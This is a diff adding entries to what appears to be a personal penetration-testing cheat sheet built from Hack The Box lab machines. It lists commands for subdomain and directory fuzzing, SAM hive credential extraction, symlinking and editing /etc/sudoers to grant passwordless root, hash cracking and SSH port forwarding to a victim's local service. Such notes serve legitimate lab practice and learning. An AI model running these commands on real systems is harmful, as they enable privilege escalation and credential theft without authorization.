@@ -20,4 +20,25 @@
   * cd Temp
   * download sam
   * download system
-  * pypykatz registry --sam sam system 
+  * pypykatz registry --sam sam system
+
+#### Subdomain Enumeration:
+  * ffuf -u http://permx.htb -H "Host:FUZZ.permx.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18
+
+#### Directory Enumeration
+  * gobuster dir -u http://lms.permx.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+#### Symlink Techniques:
+  * ln -s /etc/sudoers /home/john/sudoerss
+
+#### Manipulating sudoers file:
+  * vi /etc/sudoers
+    * john ALL=(ALL:ALL) NOPASSWD: ALL
+   
+#### Hash cracking:
+  * john john.hash -w=/usr/share/wordlists/rockyou.txt
+
+#### SSH local port forwarding:
+  * Service in running on victim machine 127.0.0.1:8080 and can only be accessed via localhost
+    * kali-Attacker$ ssh -L 0.0.0.0:9999:127.0.0.1:PORT john@VICTIM-IP
+    * kali-Attacker$ curl -I http://127.0.0.1:9999
